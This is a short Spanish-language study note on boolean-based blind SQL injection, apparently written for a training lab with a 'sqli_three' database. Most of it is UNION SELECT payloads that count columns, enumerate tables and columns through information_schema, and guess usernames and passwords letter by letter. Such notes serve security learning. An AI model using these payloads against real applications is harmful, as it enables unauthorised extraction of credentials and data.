Blind SQLi - Boolean Based


Basada en Boolean

La inyeccion SQL basada en booleanos se refiere a la respuesta que recibimos de nuestro intentos de inyeccion, que puede ser verdadero o falso, si o no, activado o desactivado, 1 o 0 o cualquier respuesta que solo pueda tener dos

resultados. Ese resultado confirma que nuestra carga util de inyeccion SQL fue exitosa o no.

Es como un ataque de diccionario pero en SQLi

A partir de la siguiente consulta SQL que verifica si el usuario existe, validando la respuesta obtenida TRUE o FALSE

select * from users where username = '%username%' LIMIT 1;

Se intenta identificar el numero de columnas

admin123' UNION SELECT 1;--

admin123' UNION SELECT 1,2,3;--

Se intenta identificar el nombre de la base de datos

admin123' UNION SELECT 1,2,3 where database() like 's%';--

Se intenta identificar el nombre de la tabla de usuarios

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

Se intenta identificar las columnas de la tabla usuarios

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

Se intenta identificar el usuario

admin123' UNION SELECT 1,2,3 from users where username like 'a%

Se intenta identificar la password

admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
